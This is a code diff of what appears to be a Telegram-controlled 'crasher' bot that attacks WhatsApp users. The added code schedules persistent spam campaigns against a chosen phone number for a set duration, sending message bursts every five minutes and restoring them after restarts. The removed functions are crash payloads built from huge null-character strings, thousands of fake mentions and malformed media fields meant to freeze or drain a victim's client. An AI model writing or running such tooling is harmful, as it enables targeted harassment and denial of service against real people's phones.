@@ -647,6 +647,8 @@ process.on(
 
 startSesi();
 
+restoreSpamTasks();
+
 const checkWhatsAppConnection = (ctx, next) => {
     if (!isWhatsAppConnected) {
         ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
@@ -3545,80 +3547,119 @@ been successfully analyzed.
 //                                                    
 //
 
-bot.command('blank', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
-    
-    let q = ctx.message?.text?.split(" ")[1];
-    
-    if (!q) return ctx.reply(
-        `Invalid Format
+bot.command(
+    'sdev',
+    checkExecutionLimit,
+    checkWhatsAppConnection,
+    checkPremiumAccess,
+    CheckCooldown,
+    async (ctx) => {
 
-Usage:
-/spamandro <target_number>
+        let args =
+            ctx.message.text.split(" ");
 
-Example:
-/spamandro 628xxxxxxxx`
-    );
-    
-    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    
-    try {
-        
-        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
-            caption: `
+        let q =
+            args[1];
+
+        let durationInput =
+            args[2];
+
+        if (!q || !durationInput) {
+
+            return ctx.reply(
+`❖ INVALID FORMAT
+
 \`\`\`ruby
-V O G U E  •  C R A S H E R
-──────────────────────────
-
-EXECUTION STATUS
-
-Target      : ${q}
-Status      : Success
-
-──────────────────────────
+/spamandro 628xxx 1d
+/spamandro 628xxx 12h
+/spamandro 628xxx 30m
 \`\`\``,
-            parse_mode: "markdown",
-            reply_markup: {
-                inline_keyboard: [
-                    [{
-                        text: "Check Target",
-                        url: `https://wa.me/${q}`,
-                        style: "primary"
-                    }]
-                ]
-            }
-        });
-        
-        (async () => {
-            
-            const instanceId = Date.now() + Math.random();
-            
-            for (let i = 0; i < 2; i++) {
-                try {
-                    await ExploitSender(sock, target);
-                    await sleep(1500)
-                } catch (e) {
-                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
-                    await restartBot("Connection Closed");
-                }
-            }
-            
-            console.log(`[WORKER ${instanceId}] Done for ${q}`);
-            
-        })();
-        
-    } catch (error) {
-        
-        ctx.reply(
-            `Operation Failed
+{
+    parse_mode: "Markdown"
+}
+            );
+        }
 
-The system was unable to execute the requested module.
-Please verify the target input and system status before retrying.`
+        const duration =
+            parseDuration(
+                durationInput
+            );
+
+        if (!duration) {
+
+            return ctx.reply(
+`❖ INVALID DURATION
+
+\`\`\`ruby
+Valid:
+1d
+12h
+30m
+10s
+\`\`\``,
+{
+    parse_mode: "Markdown"
+}
+            );
+        }
+
+        const clean =
+            q.replace(
+                /[^0-9]/g,
+                ""
+            );
+
+        const target =
+            clean +
+            "@s.whatsapp.net";
+
+        const now =
+            Date.now();
+
+        const task = {
+            id:
+                clean +
+                "_" +
+                now,
+
+            target,
+            duration,
+            startTime: now,
+            endTime:
+                now + duration,
+
+            active: true
+        };
+
+        const tasks =
+            loadTasks();
+
+        tasks.push(task);
+
+        saveTasks(tasks);
+
+        startSpamWorker(task);
+
+        return ctx.replyWithPhoto(
+            thumbnailUrl,
+            {
+                caption:
+`\`\`\`ruby
+VOGUE TASK DISPATCH
+
+Target     : ${clean}
+Duration   : ${durationInput}
+Loop       : 20 / 5 Minutes
+State      : Active
+
+Task successfully deployed
+\`\`\``,
+                parse_mode:
+                    "Markdown"
+            }
         );
-        
-        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
-        await restartBot("Connection Closed");
     }
-});
+);
 
 bot.command('drainet', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
@@ -3990,7 +4031,146 @@ Please verify the target input and system status before retrying.`
 //    | |_/ / |_| | |_\ \                              
 //    \____/ \___/ \____/                              
 //                                                     
-//                                                     
+//
+
+function parseDuration(input) {
+
+    const match =
+        input.match(/^(\d+)([smhd])$/);
+
+    if (!match) return null;
+
+    const value =
+        parseInt(match[1]);
+
+    const unit =
+        match[2];
+
+    const multipliers = {
+        s: 1000,
+        m: 60000,
+        h: 3600000,
+        d: 86400000
+    };
+
+    return value * multipliers[unit];
+}
+
+const TASK_FILE =
+    "./database/spam_tasks.json";
+
+function loadTasks() {
+
+    try {
+
+        return JSON.parse(
+            fs.readFileSync(TASK_FILE)
+        );
+
+    } catch {
+
+        return [];
+    }
+}
+
+function saveTasks(data) {
+
+    fs.writeFileSync(
+        TASK_FILE,
+        JSON.stringify(data, null, 2)
+    );
+}
+
+async function startSpamWorker(task) {
+
+    const worker =
+        async () => {
+
+            const now =
+                Date.now();
+
+            if (
+                now >= task.endTime
+            ) {
+
+                let tasks =
+                    loadTasks();
+
+                tasks =
+                    tasks.filter(
+                        t => t.id !== task.id
+                    );
+
+                saveTasks(tasks);
+
+                console.log(
+                    `[TASK ENDED] ${task.id}`
+                );
+
+                return;
+            }
+
+            console.log(
+                `[TASK RUNNING] ${task.id}`
+            );
+
+            for (let i = 0; i < 20; i++) {
+
+                try {
+
+                    await VogueSpamInvis(
+                        sock,
+                        task.target
+                    );
+
+                    await sleep(1500);
+
+                } catch (e) {
+
+                    console.log(
+                        `[TASK ERROR] ${e.message}`
+                    );
+                }
+            }
+
+            setTimeout(
+                worker,
+                5 * 60 * 1000
+            );
+        };
+
+    worker();
+}
+
+async function restoreSpamTasks() {
+
+    console.log(
+        "[TASK RESTORE] Waiting 1 minute..."
+    );
+
+    await sleep(60000);
+
+    const tasks =
+        loadTasks();
+
+    for (const task of tasks) {
+
+        if (!task.active)
+            continue;
+
+        if (
+            Date.now() >= task.endTime
+        ) {
+            continue;
+        }
+
+        console.log(
+            `[TASK RESTORED] ${task.id}`
+        );
+
+        startSpamWorker(task);
+    }
+}
 
 async function restartBot(reason = "Unknown") {
 
@@ -4275,90 +4455,6 @@ async function Ipongforcloseivs(sock, target) {
     }
 };
 
-async function VnXNewStcDrainKouta1000Gb(sock, target, mention = true) {
-  const vnxmsggg = generateWAMessageFromContent(
-    target,
-    {
-      stickerMessage: {
-        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMesOB0jY9pVmqed8AbefqEE83CPIBI9DDOGC4FqewtxeoK9xh7waZtTEF9n8q-W_LTva4FaZAVTMPQboIyaD2Snv89ovpA7a9u4ZoZMQ?ccb=9-4&oh=01_Q5Aa4gG61RWV_SyyBeJKbMaggbQPmrFkGBEwtoSD0PWI7mTRNQ&oe=6A2DC9FC&_nc_sid=e6ed6c&mms3=true",
-        directPath: "/o1/v/t24/f2/m238/AQMesOB0jY9pVmqed8AbefqEE83CPIBI9DDOGC4FqewtxeoK9xh7waZtTEF9n8q-W_LTva4FaZAVTMPQboIyaD2Snv89ovpA7a9u4ZoZMQ?ccb=9-4&oh=01_Q5Aa4gG61RWV_SyyBeJKbMaggbQPmrFkGBEwtoSD0PWI7mTRNQ&oe=6A2DC9FC&_nc_sid=e6ed6c",
-        mimetype: "image/webp",
-        caption: "VnX" + "\u0000".repeat(250000),
-        mediaKey: "CVFExhvf0clh6eMkb8gJYJo3MkIZu/d71Ok6+cwAslM=",
-        fileEncSha256: "kMp3KRQVrBttPAAD5bK7berU4DxToZlk8WRgv7hl0yI=",
-        fileSha256: "MKA4VLipw96dfJsB9/z/6fx3+D8cupHkrZZLEW0IMBk=",
-         fileLength: {
-          low: Math.floor(Math.random() * 1000),
-          high: 0,
-          unsigned: true,
-        },
-        mediaKeyTimestamp: "1778796672",
-        jpegThumbnail: Buffer.from(
-          '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=',
-          'base64',
-        ),
-        contextInfo: {
-          scanLengths: [
-          2899999999999999077, 1799999999999998555, 7699999999999999148,
-          1069999999999999164,
-         ],
-          isGroupStatus: true,
-          contextInfo: {
-              participant: target,
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from(
-                  { length: 2000 },
-                  () =>
-                    "1" +
-                    Math.floor(Math.random() * 900000) +
-                    "@s.whatsapp.net"
-                ),
-             ],
-              quotedMessage: {
-                extendedTextMessage: {
-                 text: "\0".repeat(250000) + "\n".repeat(25000) + "\u0000".repeat(250000),
-                }
-             }
-          },
-        }
-     }
-   },
-  { userJid: target },
-);
-  await sock.relayMessage('status@broadcast', vnxmsggg.message, {
-    additionalNodes: [
-      {
-        tag: 'meta',
-        attrs: {},
-        content: [
-          {
-            tag: 'mentioned_users',
-            attrs: {},
-            content: [
-              { tag: 'to', attrs: { jid: target }, content: undefined },
-            ],
-          },
-        ],
-      },
-    ],
-    statusJidList: [target],
-    messageId: vnxmsggg.key.id,
-  });
-  if (mention) {
-    await sock.relayMessage(
-      target,
-      {
-        statusMentionMessage: {
-          message: { protocolMessage: { key: vnxmsggg.key, type: 25 } },
-        },
-      },
-      {},
-    );
-  }
-  await sleep(1500);
-}
-
 async function VogueSpamInvis(sock, target) {
   try {
     const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];    
@@ -4457,56 +4553,6 @@ async function VogueBuldo(sock, target) {
     await restartBot("Connection Closed");
   }
 }
-}
-
-async function ExploitSender(sock, target) {
-  const msg = {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          header: { title: "Z " + "ꦾ".repeat(1000), hasMediaAttachment: false },
-          body: { text: "z҉⃝ Z CRASH".repeat(100) },
-          nativeFlowMessage: {
-            buttons: [
-              { name: "cta_url", buttonParamsJson: "{}" },
-              { name: "quick_reply", buttonParamsJson: "{}" }
-            ]
-          }
-        }
-      }
-    }
-  };
-
-  const msg2 = {
-    buttonsMessage: {
-      contentText: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(5000),
-      quotedMessage: {
-        imageMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
-          mimetype: "image/jpeg",
-          fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
-          fileLength: "999999999",
-          height: 9999,
-          width: 9999,
-          mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
-          fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
-          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1777621571",
-          contextInfo: {
-            mentionedJid: Array.from({ length: 2000 }, () => `1${Math.random() * 9e6}@s.whatsapp.net`)
-          }
-        }
-      },
-      buttons: Array.from({ length: 50 }, (_, i) => ({
-        buttonId: `btn_${i}`,
-        buttonText: { displayText: `btn ${i}` },
-        type: 1
-      }))
-    }
-  };
-
-  await sock.relayMessage(target, msg, { participant: { jid: target } });
-  await sock.relayMessage(target, msg2, { participant: { jid: target } });
 }
 
 
